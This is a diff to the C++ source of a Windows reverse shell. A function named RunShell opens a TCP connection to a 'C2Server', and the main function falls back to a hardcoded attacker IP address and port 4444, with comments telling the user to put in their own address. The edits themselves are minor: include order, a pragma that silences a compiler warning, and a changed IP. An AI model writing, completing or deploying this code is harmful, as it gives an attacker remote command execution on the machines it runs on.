@@ -1,9 +1,10 @@
 #include <iostream>
+#include <ws2tcpip.h>
 #include <winsock2.h>
 #include <windows.h>
-#include <ws2tcpip.h>
-#pragma comment(lib, "Ws2_32.lib")
+#pragma comment(lib, "Ws2_32.lib") 
 #define DEFAULT_BUFLEN 1024
+#pragma warning(disable:4996) //added this string because "WSAStartup(MAKEWORD(2,2), &version);" doesn't want to work 
 
 using namespace std;
 
@@ -19,7 +20,7 @@ void RunShell(char* C2Server, int C2Port) {
         SOCKET mySocket;
         sockaddr_in addr;
         WSADATA version;
-        WSAStartup(MAKEWORD(2, 2), &version);
+        WSAStartup(MAKEWORD(2,2), &version);
         mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
         addr.sin_family = AF_INET;
 
@@ -75,8 +76,8 @@ int main(int argc, char** argv) {
         RunShell(argv[1], port);
     }
     else {
-        char host[] = "192.168.0.101";  // change this to your ip address
-        int port = 4444;                //chnage this to your open port
+        char host[] = "192.168.1.21";  // change this to your ip address
+        int port = 4444;               // chnage this to your open port
         RunShell(host, port);
     }
     return 0;
